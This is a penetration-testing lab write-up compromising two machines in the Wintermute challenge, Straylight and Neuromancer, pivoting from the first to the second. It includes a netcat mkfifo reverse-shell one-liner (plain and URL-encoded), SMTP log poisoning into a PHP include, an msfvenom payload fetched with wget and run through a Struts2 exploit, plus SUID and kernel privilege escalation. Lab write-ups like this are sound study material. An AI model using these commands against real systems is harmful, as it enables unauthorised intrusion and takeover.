There are two machines to target in this assessment. The first has two NICs, one external and one internal. The second has one internal that is available by the first machine only. The goal is to attack and get root on the first box and then pivot 
## Discovery

#Nmap 

```bash
sudo nmap -oN -sn 192.168.1.0/24
```

###   Findings:

Target 1
**IP Address: 192.168.1.108**

## Recon

#Nmap 

```bash
sudo nmap -T4 -O -sV -sC -p- -oA strayLight 192.168.1.108
```

###   Findings:

![[strayLightNmap.png]]

| Port  | Service     | Version          |
| ----- | ----------- | ---------------- |
| 25    | SMTP   | Postfix smtpd |
| 80    | HTTP   | Apache httpd 2.4.25 |
| 3000  | HTTP  | Apache Hadoop Task Tracker |

The versions for hadoop and httpd do not seem to be vulnerable, but the smtpd might be if I can find a full version number.

Navigating to the web page game the following image with a glitch effect. After a little bit of time on the page I got redirected to a new page with a message being written on the screen.

![[Images/WinterMute/homePage.png]]

The following image is the page that I was redirected to after a few seconds.

![[redirectedMessage.png]]

So far this is nothing too interesting and there are no comments in the source code of the websites either. I am going to run a dirb scan to see if there are any hidden pages or directories.

```bash
dirb http://192.168.1.108
```
```bash
dirb http://192.168.1.108 /usr/share/usr/wordlists/dirb/big.txt
```
```bash
dirb http://192.168.1.108 -X .txt,.py,.php,.perl,.bak
```
```bash
dirb http://192.168.1.108 /usr/share/wordlists/dirb/big.txt -X 
.txt,.py,.php,.perl,.bak
```
```bash
dirb http://192.168.1.108 /usr/share/wordlists/dirb/vulns/apache.txt
```

Dirb scan only showed one result of the manual

![[apacheManualPage.png]]

The Apache Manual page is open, this could be vulnerable based on the version of Apache.

```bash
sudo nmap --script=*hadoop* -p 3000 192.168.1.108
```

I ran nmap scripts on the port with hadoop to see if nmap would find something, but nothing came back from the results

```bash
sudo nmap --script=*smtp* -p 25 192.168.1.108
```

I ran nmap scripts on the smtp port and got back some results but unfortunately nothing useful. It says that it doesn't seem to be an open relay, it is not vulnerable to cve-2010-4344, and RCPT returned an unhandled status code.

Need to see if I can find some username to test other methods of logging into this server through smtp

![[hadoopLogin.png]]

## Enumeration

I navigated to the hadoop page and was greeted with a login screen that has a lot of good information on it
    Version is ntopng
    Hint at the bottom of the page saying the default username and password are admin

![[hadoopLoggedIn.png]]

I was able to log in using the default creds that were mentioned on the log in screen and am logged in to the admin interface

![[ntopngVersion.png]]

It looks like the server is running ntopng version 2.4.180512
    Searchsploit says that version 2.4 is vulnerable, not sure if it will work on this version or not

![[ntopngUsers.png]]

I am able to view all of the users on the page, but it seems that the admin account is the only one on it

```bash
telnet 192.168.1.108 25
```
```smtp
vrfy wintermute
```

I was able to use telnet to log in to the smtp server and get a user name
    Wintermute

![[vrfyWintermuteUser.png]]

Looking through the ntopng console and the web traffic that is being generated, I saw a link being hit for "turing-bolo" on the localhost http port. Navigating to the page on port 80 of this server got a web page.

![[activeFlowsNtopng.png]]

![[turing-BoloPage.png]]

![[boloCase.png]]

I selected case from the list on the page and submitted the query and got the above page giving some information on the user case. The rest of the users in the list are below.

![[boloMolly.png]]

![[boloArmitage.png]]

![[boloRiviera.png]]

Saw another entry in the list on ntopng web console for something called "freeside," navigated there and got a different webpage with just an image

![[freesidePage.png]]

Looking back at the turing page, "turing-bolo" I was realized that the website was running a php script to pull the specific queries for each person. If you look at the URL it is putting a php parameter of "case" for the first one and then for each other person as well. Everywhere else it seems to be using the name.log instead though, so maybe this is pulling a log file from the system.
    Could this be a possible file traversal/LFI possibility?

![[turingPagePHPParameter.png]]

I tried to put /etc/passwd in to the parameter, but that did not work. It seems that the script is doing something else than just taking a parameter.

Looking at the way that the script is taking a parameter, it seems that it is taking a log file and then appending the .log to the parameter after. With this assumption, I tried a log file that I knew would be on the system, the mail log file /var/log/mail and I got a response

![[mailLogFile.png]]

With this I might be able to add something to the log file in order to do some log poisoning and run some remote code using the telnet SMTP connection.

There is a vulnerability in Searchsploit that is a remote command injection for postfix smtp. It is not the version that this server is running, but since it is doing the same thing I am going to see what it is doing and see if I can replicate it with this.

The python script is creating a message that it sends to the server to put it in the logs. Since I know that the server is running PHP I sent it a PHP blurb that is looking for a parameter CMD so that I can send a command for the server to run.

![[remoteCodeInjectionScript.png]]

![[sendingCodeToSmtpLog.png]]

I tried a reverse shell with regular sh command and tried it URL encoded, but it didn't work. It seems to be messing up for some reason. I am going to try other methods.

It worked! I was able to get a reverse shell using this remote code injection.
I used a netcat reverse shell and url encoded it and then sent it to the system

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.85 4444 >/tmp/f
```

```urlencoded
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.1.85%204444%20%3E%2Ftmp%2Ff
```

![[reverseShellCaught.png]]

## Recon

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

I was able to get a TTY shell and read the /etc/passwd file and see that there are two other users on the system
    wintermute
    turing-police

![[etcPasswdStraylight.png]]

I was able to read the home directories of each user, but both were empty other than the default files

I was able to find all of the files that have the UID set and found a few that are not normal to find
    Ping
    Screen-4.5.0

![[UIDSet.png]]

## Enumeration

There is a vulnerability in Screen-4.5 that should allow me to get root access on the system.

https://www.exploit-db.com/exploits/41154

I was able to copy over the exploit to my attack machine and then start an http server with Python to transfer over the file to the target machine.

![[screenKillerFile.png]]

![[httpServerStart.png]]

![[fileTransferStraylight.png]]

I was then able to run the script and achieved a root shell on the system and was able to read the flag.

![[screenKillerRunning.png]]

## PWNED

![[strayLightRootFlag.png]]

## Discovery

Now that I have root on this system, I am going to find the next target subnet and victim.

```bash
ifconfig
```

![[strayLightIfconfig.png]]

It seems that this machine is has a second NIC that is on the subnet of 10.0.2.0/24 and is currently assigned the IP of 10.0.2.4

If I look at the ARP table for this machine, I found an entry for 10.0.2.3. I am not sure yet if this is the other machine, but I will keep searching

![[strayLightArpTable.png]]

I ran a ping sweep on the network to create traffic to populate the arp table further and find all the hosts on this network

```meterpreter
run post/multi/gather/ping_sweep rhosts=10.0.2.0/24
```

![[strayLightPingSweep.png]]

Looking at the arp table now brings up some new results that has the next target machine in it

![[strayLightUpdatedArpTable.png]]

The matching IP address is 10.0.2.5

**IP Address: 10.0.2.5** 

## Recon

There is a note on the root directory of the Stray Light system that tells about an open api on the system that I might be able to exploit and get on with.

![[strayLightNote.png]]

I created a route to the subnet through meterpreter so that I can scan the target machine and get the open ports

```meterpreter
run autoroute -s 10.0.2.0/24
```

Open ports on the target machine
    8009
    8080
    34483

I created a port forward to the three above ports using the below command and scanned it with nmap to see what the ports are running

```meterpreter
portfwd add -l 10000 -p 8009 -r 10.0.2.5
```

```bash
sudo nmap -sV -sC -p 10000-10002 127.0.0.1
```

| Port  | Service     | Version          |
| ----- | ----------- | ---------------- |
| 8009  | snet-sensor-mgmt   | Not Found |
| 8080  | scp-config   | Not Found |
| 34483 | ssh         | OpenSSH 7.2p2    |

One of these ports must be an HTTP server because of what the note said. I know it isn't port 34483 because it that is SSH, nmap couldn't identify the other ports so I will need to use netcat or something else to identify what they are

![[strayLightNetcatPorts.png]]

```bash
nc -nv 10.0.2.5 8009
```
```bash
nc -nv 10.0.2.5 8080
```

I found that port 8080 seems to be the http server. I can't tell what version the port is running, but the port is showing http at least

I am going to see if I can connect to the directory that was in the note

I was not able to access it with the port forward through meterpreter but I was able to create a new port forward with socat and access the site that way

```bash
socat tcp-listen:5555, fork tcp:10.0.2.5:8080
```

![[neuromancerTomcatPage.png]]

Once on the site I can see that the server is running an Apache Tomcat server on it but I don't see an exact version yet.

I navigated to the directory that was mentioned in the note and was able to get to that page
    /struts2_2.3.15.1-showcase

![[neuromancerStrutsShowcasePage.png]]

It seems that this server is running struts version 2.3.15 and when I ran a searchsploit search on this version I was able to find a remote code execution exploit for struts version 2.3.x showcase. Fortunately for me, that is exactly what this page is

![[neuromancerStrutsVulnerabilitySearch.png]]

Running the exploit, it is wanting the url and the command and it is sending the command to the page using a vulnerability in the way that the page is building the java processes

```bash
socat tcp-listen:4443,fork tcp:192.168.1.85:4443
```

I opened a socat listener to forward traffic to my machine from the remote machine and tried a few different options for reverse shells, but I was unable to get a connection from the machine

I am going to try and craft an executable through msfvenom to see if that will work instead

```msfvenom
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4443 -f elf -o revShell
```


```python
python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget -O /tmp/revShell 10.0.2.4:4443/revShell"
```
```python
python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/revShell"
```
```python
python 42324.py http://192.168.1.108:5555/struts2_2.3.15.1-showcase/integration/saveGangster.action "/tmp/revShell"
```

After this I was able to go back into my sessions and see that I had an active connection with the target machine neuromancer

I was able to run an ID command to see that I was logged in as a user named "ta" and then ran "cat /etc/passwd" to see all of the users that are on the machine

![[neuromancerIDPasswd.png]]

There are two different account on this machine
    ta
    lady3jane

I am logged in as ta but I do not have the password, so I can't see my privileges yet

Now that I am on the system, I start looking at the different files that I have access to

There is a file in the home directory of ta called ai-gui-guide.txt and I was able to look at its contents

![[neuromancrAiGuide.png]]

Here I am able to see where all of the different install locations are and by seeing this I know exactly where to look user files that might have some passwords in them

Looking in the tomcat files I was able to fine lady3jane's password, but it is encoded

![[lady3janePasswordEncoded.png]]

Decoding this I was able to get the password as
    >!Xx3JanexX!<

I was able to log in as lady3jane and now I can see if I have sudo privileges as this user

Unfortunately I am not able to run sudo as this user and I will need to find another path onto the system now

There are some paths for privilege escalation with set UID bits, but I can't use them without being able to run sudo 

![[neuromancerSetUID.png]]

After running linpeas I was able to find that there is an exploit with the sudo version that this system is running that I might be able to exploit as well as the kernel version that I may be able to exploit as well

![[neuromancerSudoAndKernelVersion.png]]

This sudo version has an exploit in searchsploit that I can use to get root access, unfortunately I need the ta password in order to run this exploit and I still don't have that so it won't work

Luckily the linux kernel looks like it may work for me. There is a local privilege escalation exploit for this exact kernel version that looks like it is going to work to get root. I just have to get it on the system somehow to run it

I had to compile it on my machine and then move it over to the target because the target did not have a C compiler on it. I also had to do a static compile of the exploit because the libraries were not on the target machine.

```bash
gcc -static -o privEsc 44298.c
```

Once compiled, I used scp to transfer the file over to the target and use an ssh session through the socat tunnel to run the exploit and this got me the root shell.

## PWNED

![[neuromancerRootShell.png]]

Now as root I am able to read the flag that is in the root directory and I have finished this box.

![[neuromancerRootFlag.png]]
